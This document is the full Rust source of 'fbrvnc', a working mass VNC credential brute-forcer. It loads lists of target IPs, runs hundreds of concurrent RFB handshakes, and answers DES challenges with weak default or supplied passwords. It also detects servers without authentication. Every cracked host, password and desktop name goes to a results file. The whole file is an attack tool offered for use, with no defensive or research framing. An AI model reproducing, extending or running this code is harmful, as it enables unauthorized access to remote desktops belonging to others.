
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Write};
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, RwLock};
use std::time::{Duration, Instant};

use des::cipher::generic_array::GenericArray;
use des::cipher::{BlockEncrypt, KeyInit};
use des::Des;
use futures::stream::{self, StreamExt};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Mutex as AsyncMutex;

// ============================================================================
// Constants
// ============================================================================

const VERSION: &str = "0x204";

const DEFAULT_IPS_FILE:     &str = "IPs.txt";
const DEFAULT_RESULTS_FILE: &str = "results.txt";
const DEFAULT_TIMEOUT:      f64  = 5.0;
const DEFAULT_THREADS:      usize = 500;
const DEFAULT_PORT:         u16  = 5900;

const DEFAULT_PASSWORDS: &[&str] = &["123456", "1234", "abc", "admin"];

// ============================================================================
// CLI
// ============================================================================

struct Cli {
    ips_file:       PathBuf,
    passwords_file: Option<PathBuf>,
    timeout:        f64,
    threads:        usize,
}

impl Cli {
    fn parse() -> Result<Self, String> {
        let mut cli = Cli {
            ips_file:       PathBuf::from(DEFAULT_IPS_FILE),
            passwords_file: None,
            timeout:        DEFAULT_TIMEOUT,
            threads:        DEFAULT_THREADS,
        };

        let mut it = std::env::args().skip(1);
        while let Some(arg) = it.next() {
            match arg.as_str() {
                "-i" | "--ip" => {
                    let v = it.next().ok_or("missing value for -i/--ip")?;
                    cli.ips_file = PathBuf::from(v);
                }
                "-p" | "--password" => {
                    let v = it.next().ok_or("missing value for -p/--password")?;
                    cli.passwords_file = Some(PathBuf::from(v));
                }
                "-t" | "--timeout" => {
                    let v = it.next().ok_or("missing value for -t/--timeout")?;
                    cli.timeout = v.parse::<f64>()
                        .map_err(|_| format!("invalid timeout: {}", v))?;
                    if cli.timeout <= 0.0 {
                        return Err("timeout must be > 0".into());
                    }
                }
                "-th" | "--threads" => {
                    let v = it.next().ok_or("missing value for -th/--threads")?;
                    cli.threads = v.parse::<usize>()
                        .map_err(|_| format!("invalid threads: {}", v))?;
                    if cli.threads == 0 {
                        return Err("threads must be > 0".into());
                    }
                }
                "-h" | "--help" => {
                    print_usage();
                    std::process::exit(0);
                }
                other => return Err(format!("unknown argument: {}", other)),
            }
        }
        Ok(cli)
    }
}

fn print_usage() {
    println!("fbrvnc {}", VERSION);
    println!();
    println!("Usage: fbrvnc [options]");
    println!();
    println!("Options:");
    println!("  -i,  --ip <file>        IP list file          (default: {})", DEFAULT_IPS_FILE);
    println!("  -p,  --password <file>  Password list file    (default: built-in)");
    println!("  -t,  --timeout <sec>    Per-attempt timeout   (default: {})", DEFAULT_TIMEOUT);
    println!("  -th, --threads <n>      Concurrent workers    (default: {})", DEFAULT_THREADS);
    println!("  -h,  --help             Show this help");
    println!();
    println!("IP file format (one per line):");
    println!("    <ip>            use default port {}", DEFAULT_PORT);
    println!("    <ip>:<port>     explicit port");
    println!("  Lines starting with '#' are ignored.");
    println!();
    println!("Default passwords (used when -p is not supplied):");
    for pw in DEFAULT_PASSWORDS {
        println!("    {}", pw);
    }
    println!();
    println!("Results are written to \"{}\" in the current directory.", DEFAULT_RESULTS_FILE);
}

// ============================================================================
// Loading
// ============================================================================

#[derive(Clone, PartialEq, Eq, Debug)]
struct Server {
    ip:   String,
    port: u16,
}

fn is_ip(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 4 { return false; }
    parts.iter().all(|p| {
        !p.is_empty() && p.parse::<u16>().map(|n| n <= 255).unwrap_or(false)
    })
}

fn load_servers(path: &Path, default_port: u16) -> io::Result<Vec<Server>> {
    let file = File::open(path)
        .map_err(|e| io::Error::new(e.kind(), format!("\"{}\": {}", path.display(), e)))?;
    let mut out = Vec::new();
    for line in BufReader::new(file).lines().flatten() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') { continue; }

        if line.matches(':').count() == 1 {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() == 2 && is_ip(parts[0]) {
                if let Ok(port) = parts[1].parse::<u16>() {
                    out.push(Server { ip: parts[0].into(), port });
                }
            }
        } else if is_ip(line) {
            out.push(Server { ip: line.into(), port: default_port });
        }
    }
    Ok(out)
}

fn load_passwords(path: &Path) -> io::Result<Vec<String>> {
    let file = File::open(path)
        .map_err(|e| io::Error::new(e.kind(), format!("\"{}\": {}", path.display(), e)))?;
    Ok(BufReader::new(file).lines().flatten().collect())
}

fn default_passwords() -> Vec<String> {
    DEFAULT_PASSWORDS.iter().map(|s| s.to_string()).collect()
}

// ============================================================================
// DES (VNC legacy: 8-byte key, bit-reversed)
// ============================================================================

fn make_cipher(password: &str) -> Des {
    let pb = password.as_bytes();
    let mut key = [0u8; 8];
    for (i, k) in key.iter_mut().enumerate() {
        let b = if i < pb.len() { pb[i] } else { 0 };
        *k = b.reverse_bits();
    }
    Des::new(&GenericArray::from(key))
}

// ============================================================================
// RFB auth
// ============================================================================

struct RfbResult {
    null: bool,
    name: String,
}

async fn rfb_attempt(
    host: &str,
    port: u16,
    cipher: &Des,
    timeout: Duration,
) -> Option<RfbResult> {
    let sa = format!("{}:{}", host, port).parse::<SocketAddr>().ok()?;
    let mut s = tokio::time::timeout(timeout, TcpStream::connect(sa)).await.ok()?.ok()?;
    s.set_nodelay(true).ok();

    let mut buf = [0u8; 12];
    tokio::time::timeout(timeout, s.read_exact(&mut buf)).await.ok()?.ok()?;
    if &buf[..3] != b"RFB" { return None; }
    s.write_all(b"RFB 003.003\n").await.ok()?;

    let mut m = [0u8; 4];
    tokio::time::timeout(timeout, s.read_exact(&mut m)).await.ok()?.ok()?;
    let method = u32::from_be_bytes(m);

    let (null, name) = match method {
        1 => {
            s.write_all(&[1]).await.ok()?;
            (true, read_server_name(&mut s, timeout).await?)
        }
        2 => {
            let mut ch = [0u8; 16];
            tokio::time::timeout(timeout, s.read_exact(&mut ch)).await.ok()?.ok()?;
            let mut b1 = GenericArray::clone_from_slice(&ch[..8]);
            let mut b2 = GenericArray::clone_from_slice(&ch[8..]);
            cipher.encrypt_block(&mut b1);
            cipher.encrypt_block(&mut b2);
            let mut resp = [0u8; 16];
            resp[..8].copy_from_slice(&b1);
            resp[8..].copy_from_slice(&b2);
            s.write_all(&resp).await.ok()?;

            let mut st = [0u8; 4];
            tokio::time::timeout(timeout, s.read_exact(&mut st)).await.ok()?.ok()?;
            if u32::from_be_bytes(st) != 0 { return None; }

            s.write_all(&[1]).await.ok()?;
            (false, read_server_name(&mut s, timeout).await?)
        }
        _ => return None,
    };
    Some(RfbResult { null, name })
}

async fn read_server_name(s: &mut TcpStream, timeout: Duration) -> Option<String> {
    let mut h = [0u8; 24];
    tokio::time::timeout(timeout, s.read_exact(&mut h)).await.ok()?.ok()?;
    let namelen = u32::from_be_bytes([h[20], h[21], h[22], h[23]]) as usize;
    if namelen == 0    { return Some(String::new()); }
    if namelen > 4096  { return Some("<name too long>".into()); }
    let mut name = vec![0u8; namelen];
    tokio::time::timeout(timeout, s.read_exact(&mut name)).await.ok()?.ok()?;
    Some(String::from_utf8_lossy(&name).into_owned())
}

// ============================================================================
// Result writer (unbuffered)
// ============================================================================

struct ResultWriter {
    file: Mutex<File>,
}

impl ResultWriter {
    fn open(path: &Path) -> io::Result<Self> {
        let file = OpenOptions::new()
            .create(true).write(true).truncate(true).open(path)?;
        Ok(Self { file: Mutex::new(file) })
    }

    fn write_line(&self, line: &str) {
        let mut f = match self.file.lock() {
            Ok(g)  => g,
            Err(_) => { eprintln!("[!] result writer lock poisoned"); return; }
        };
        if let Err(e) = f.write_all(format!("{}\n", line).as_bytes()) {
            eprintln!("[!] write error: {}", e);
        }
    }
}

// ============================================================================
// Console output helpers
// ============================================================================

fn print_hit(idx: u64, body: &str) {
    print!("\r\x1B[2K[{}] {}\n", idx, body);
    io::stdout().flush().ok();
}

fn draw_progress(done: usize, total: usize, password: &str, cracked: u64) {
    print!(
        "\r\x1B[2K[*] progress: {}/{}  password=\"{}\"  cracked={}",
        done, total, password, cracked
    );
    io::stdout().flush().ok();
}

fn clear_progress_line() {
    print!("\r\x1B[2K");
    io::stdout().flush().ok();
}

// ============================================================================
// Brute engine
// ============================================================================

async fn run_brute(
    servers:     Vec<Server>,
    passwords:   Vec<String>,
    writer:      Arc<ResultWriter>,
    threads:     usize,
    timeout_sec: f64,
) -> io::Result<()> {
    let total_servers = servers.len();
    let timeout       = Duration::from_secs_f64(timeout_sec);
    let workers       = threads.max(1);

    let servers_mu = Arc::new(AsyncMutex::new(servers));
    let current_pw = Arc::new(RwLock::new(String::new()));
    let shutdown   = Arc::new(AtomicBool::new(false));
    let found_cnt  = Arc::new(AtomicU64::new(0));
    let start_time = Instant::now();

    // Progress reporter
    {
        let cp   = current_pw.clone();
        let sm   = servers_mu.clone();
        let kill = shutdown.clone();
        let fc   = found_cnt.clone();
        let tot  = total_servers;

        tokio::spawn(async move {
            let mut tick = tokio::time::interval(Duration::from_millis(250));
            tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
            loop {
                tick.tick().await;
                if kill.load(Ordering::Relaxed) { break; }

                let pw        = cp.read().unwrap().clone();
                let remaining = sm.lock().await.len();
                let found     = fc.load(Ordering::Relaxed);
                let done      = tot.saturating_sub(remaining);

                if !pw.is_empty() {
                    draw_progress(done, tot, &pw, found);
                }
            }
        });
    }

    for password in &passwords {
        *current_pw.write().unwrap() = password.clone();

        let snapshot: Vec<Server> = servers_mu.lock().await.clone();
        if snapshot.is_empty() { break; }

        let cipher  = Arc::new(make_cipher(password));
        let cracked = Arc::new(AsyncMutex::new(Vec::<Server>::new()));

        stream::iter(snapshot)
            .for_each_concurrent(workers, |srv| {
                let cipher  = cipher.clone();
                let writer  = writer.clone();
                let cracked = cracked.clone();
                let pw      = password.clone();
                let fc      = found_cnt.clone();

                async move {
                    if let Some(res) =
                        rfb_attempt(&srv.ip, srv.port, &cipher, timeout).await
                    {
                        let pw_str = if res.null { "null".to_string() } else { pw };

                        let file_line = format!(
                            "{}:{}-{}-[{}]",
                            srv.ip, srv.port, pw_str, res.name
                        );
                        writer.write_line(&file_line);

                        let idx = fc.fetch_add(1, Ordering::Relaxed) + 1;
                        print_hit(idx, &file_line);

                        cracked.lock().await.push(srv);
                    }
                }
            })
            .await;

        let cracked = std::mem::take(&mut *cracked.lock().await);
        if !cracked.is_empty() {
            let mut sv = servers_mu.lock().await;
            sv.retain(|s| !cracked.iter().any(|c| c.ip == s.ip && c.port == s.port));
        }
    }

    shutdown.store(true, Ordering::Relaxed);
    tokio::time::sleep(Duration::from_millis(400)).await;
    clear_progress_line();

    let elapsed   = start_time.elapsed();
    let found     = found_cnt.load(Ordering::Relaxed);
    let remaining = servers_mu.lock().await.len();

    println!();
    println!("BRUTE COMPLETE");
    println!("  elapsed:       {:.2}s", elapsed.as_secs_f64());
    println!("  cracked:       {} / {}", found, total_servers);
    println!("  uncracked:     {}", remaining);
    println!("  results file:  {}", DEFAULT_RESULTS_FILE);

    Ok(())
}

// ============================================================================
// Entry point
// ============================================================================

fn main() {
    let cli = match Cli::parse() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("error: {}", e);
            eprintln!();
            print_usage();
            std::process::exit(1);
        }
    };

    let servers = match load_servers(&cli.ips_file, DEFAULT_PORT) {
        Ok(s) => s,
        Err(e) => { eprintln!("error: cannot load servers: {}", e); std::process::exit(1); }
    };
    if servers.is_empty() {
        eprintln!("error: no servers loaded from \"{}\"", cli.ips_file.display());
        std::process::exit(1);
    }

    let (passwords, pw_source) = match &cli.passwords_file {
        Some(p) => {
            let list = match load_passwords(p) {
                Ok(v) => v,
                Err(e) => { eprintln!("error: cannot load password file: {}", e); std::process::exit(1); }
            };
            if list.is_empty() {
                eprintln!("error: password file \"{}\" is empty", p.display());
                std::process::exit(1);
            }
            (list, p.display().to_string())
        }
        None => (default_passwords(), "built-in default".to_string()),
    };

    // ---- banner (gọn) ----
    println!();
    println!("=================");
    println!("  fbrvnc {}", VERSION);
    println!("=================");
    println!("  ips_file:     {} ({} servers)", cli.ips_file.display(), servers.len());
    println!("  passwords:    {} ({} entries)", pw_source, passwords.len());
    println!("  threads:      {}", cli.threads);
    println!("  timeout:      {:.1}s", cli.timeout);
    println!("  output_file:  {}", DEFAULT_RESULTS_FILE);
    println!("=================");
    println!();

    let writer = match ResultWriter::open(Path::new(DEFAULT_RESULTS_FILE)) {
        Ok(w) => Arc::new(w),
        Err(e) => {
            eprintln!("error: cannot open \"{}\": {}", DEFAULT_RESULTS_FILE, e);
            std::process::exit(1);
        }
    };

    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("failed to create tokio runtime");

    if let Err(e) = rt.block_on(run_brute(
        servers, passwords, writer, cli.threads, cli.timeout,
    )) {
        eprintln!("[!] error: {}", e);
        std::process::exit(1);
    }
}
